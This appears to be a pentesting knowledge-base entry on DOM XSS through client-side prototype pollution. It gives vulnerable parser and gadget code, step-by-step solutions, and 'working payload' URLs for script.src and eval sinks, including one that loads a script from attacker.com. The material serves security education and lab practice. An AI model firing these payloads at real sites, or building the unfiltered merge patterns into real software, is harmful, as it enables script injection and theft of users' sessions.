# DOM XSS — Via Client-Side Prototype Pollution

## When this applies

Client-side JavaScript merges URL parameters into objects using a vulnerable function (`deparam`, `$.extend`, `_.merge`) that doesn't filter `__proto__`. A separate DOM gadget reads `obj.someProperty` and uses it in a sink (`script.src`, `eval`, `innerHTML`). Pollution + gadget = DOM XSS.

> Note: For comprehensive prototype pollution coverage (server-side, gadget discovery, bypass techniques), see `../prototype-pollution/`. This scenario covers the specific case of DOM-XSS-via-pollution.

## Technique

Prototype pollution allows attackers to inject properties into `Object.prototype`, affecting all JavaScript objects.

**Concept:**
```javascript
// Normal object
let obj = {};
obj.admin; // undefined

// After pollution
Object.prototype.admin = true;
obj.admin; // true (inherited from prototype)
```

### How Prototype Pollution Works

**Pollution sources:**
```javascript
// URL parameter
/?__proto__[admin]=true

// JSON parsing (unsafe merge)
Object.assign({}, JSON.parse(userInput))

// Recursive merge
function merge(target, source) {
    for (let key in source) {
        target[key] = source[key]; // Can pollute via __proto__
    }
}
```

## Steps

### Pattern 1 — `transport_url` Gadget Loading Script

#### Vulnerable Code

**deparam.js (pollution source):**
```javascript
function deparam(params) {
    let obj = {};
    params.replace(/([^=&]+)=([^&]*)/g, function(m, key, value) {
        obj[decodeURIComponent(key)] = decodeURIComponent(value);
    });
    return obj;
}
// Usage: deparam(location.search.substring(1))
// Allows: ?__proto__[property]=value
```

**searchLogger.js (gadget):**
```javascript
let config = {};
if (config.transport_url) {
    let script = document.createElement('script');
    script.src = config.transport_url;
    document.body.appendChild(script);
}
```

#### Vulnerability Analysis
- **Pollution source:** URL parameters via `deparam.js`
- **Pollution vector:** `__proto__[property]`
- **Gadget:** `config.transport_url` check
- **Sink:** `script.src` assignment

#### Step-by-Step Solution

1. Identify prototype pollution source (deparam.js).
2. Find the gadget (transport_url in searchLogger.js).
3. Craft pollution URL: `/?__proto__[transport_url]=data:,alert(1);//`.
4. Navigate to the URL.
5. Script loads and executes.

#### Working Payload

```
/?__proto__[transport_url]=data:,alert(1);//
```

#### Payload Breakdown

1. **`__proto__`** - Special property that references Object.prototype
2. **`[transport_url]`** - Property name to pollute
3. **`data:,alert(1);`** - Data URI with JavaScript
4. **`//`** - Comments out any hardcoded suffix

#### How the Exploit Works

**Step 1 - Pollution:**
```javascript
// URL: /?__proto__[transport_url]=data:,alert(1);//
// deparam.js processes this and creates:
Object.prototype.transport_url = 'data:,alert(1);//'
```

**Step 2 - Gadget triggers:**
```javascript
let config = {}; // Empty object
if (config.transport_url) { // undefined in config, checks prototype
    // Object.prototype.transport_url exists!
    let script = document.createElement('script');
    script.src = config.transport_url; // 'data:,alert(1);//'
    document.body.appendChild(script); // XSS!
}
```

**Step 3 - Execution:**
```html
<script src="data:,alert(1);//"></script>
```

#### Alternative Payloads

```
/?__proto__[transport_url]=data:,alert(document.domain);//
/?__proto__[transport_url]=https://attacker.com/xss.js
/?__proto__[transport_url]=data:text/html,<script>alert(1)</script>
```

### Pattern 2 — `eval()` Gadget With Syntax Suffix

#### Vulnerable Code

**searchLoggerAlternative.js:**
```javascript
let manager = {};
if (manager && manager.sequence) {
    eval('manager.macro(' + manager.sequence + ')');
}
```

#### Vulnerability Analysis
- **Pollution vector:** `__proto__.sequence`
- **Gadget:** `manager.sequence` undefined check
- **Sink:** `eval()` with concatenated code
- **Challenge:** Code appends ')' after sequence

#### Step-by-Step Solution

1. Identify eval() gadget using manager.sequence.
2. Notice the code appends ')' : `eval('manager.macro(' + sequence + ')')`.
3. Need to fix syntax.
4. Use trailing `-` operator: `alert(1)-`.
5. Final payload: `/?__proto__.sequence=alert(1)-`.

#### Working Payload

```
/?__proto__.sequence=alert(1)-
```

#### Payload Breakdown

Without fix:
```javascript
eval('manager.macro(' + 'alert(1)' + ')');
// Result: manager.macro(alert(1))
// alert(1) executes but syntax error on macro call
```

With `-` fix:
```javascript
eval('manager.macro(' + 'alert(1)-' + ')');
// Result: manager.macro(alert(1)-)
// alert(1) executes, alert(1)-undefined = NaN, macro(NaN) may error but XSS achieved
```

#### Alternative Syntax Fixes

```javascript
// Using semicolon and comment
/?__proto__.sequence=alert(1);//

// Using comma operator
/?__proto__.sequence=alert(1),0

// Using boolean operator
/?__proto__.sequence=alert(1)||0

// Using void
/?__proto__.sequence=void(alert(1))

// Using assignment
/?__proto__.sequence=x=alert(1)
```

### Common DOM Gadgets

**Script source:**
```javascript
if (config.scriptSrc) {
    let script = document.createElement('script');
    script.src = config.scriptSrc;
}
```

**eval() with options:**
```javascript
if (options.onload) {
    eval(options.onload);
}
```

**innerHTML with template:**
```javascript
if (settings.template) {
    element.innerHTML = settings.template;
}
```

**location redirect:**
```javascript
if (redirect.url) {
    location.href = redirect.url;
}
```

### Comparison of the Two Patterns

| Feature | `transport_url` (Pattern 1) | `sequence` eval (Pattern 2) |
|---------|------------------------|-------------------|
| **Source** | deparam.js URL parsing | Same or similar |
| **Gadget** | config.transport_url | manager.sequence |
| **Sink** | script.src | eval() |
| **Payload** | data:,alert(1);// | alert(1)- |
| **Technique** | Data URI | Syntax fixing |
| **Difficulty** | Standard | Requires syntax adjustment |

### Using Burp Suite DOM Invader

**Automatic Detection:**
1. Open the page in Burp's browser with DOM Invader enabled
2. Open Developer Tools → DOM Invader tab
3. Click "Scan for prototype pollution sources"
4. DOM Invader identifies `__proto__` in URL parameters
5. Click "Scan for gadgets"
6. DOM Invader finds `transport_url` gadget in script.src
7. Click "Exploit" → Generates working payload
8. Verify XSS executes

**Manual Testing:**
```javascript
// In browser console
Object.prototype.test = 'polluted';
let obj = {};
console.log(obj.test); // 'polluted' - pollution confirmed
```

## Verifying success

- After visiting the polluted URL, `Object.prototype.<gadget-key>` returns the injected value.
- The payload triggers (alert fires, fetch to attacker, etc.).
- Without the URL parameter (or after `delete Object.prototype.<key>`), the gadget reverts to default behavior.

## Common pitfalls

1. **Wrong sink-to-payload mapping** — `data:,alert(1);//` works for `script.src`, not for `innerHTML`. For `innerHTML` use HTML payload like `<img src=x onerror=alert(1)>`.
2. **Pollution doesn't reach gadget** — load order matters; gadget runs before pollution. Inspect script load sequence.
3. **CSP `script-src 'self'`** — `data:` URIs blocked. Pivot to gadgets that use `eval` or `Function`.
4. **Hashtag-based pollution requires hashchange-aware parser** — only some libraries handle `location.hash`.
5. **`Object.create(null)` defeats the gadget** — the prototype-less object skips your `__proto__`. Look for gadgets using regular objects.

## Tools

- **DOM Invader** — automated source/gadget discovery + exploit generation
- **PPScan browser extension** — real-time detection during browsing
- **`BlackFan/client-side-prototype-pollution`** — gadget collection
- **DevTools Sources panel + breakpoints on `script.src=`, `eval`, `Function`** — manual flow tracing

## Related

- `../prototype-pollution/` directory — broader prototype pollution coverage (server-side, gadget discovery, bypass techniques)
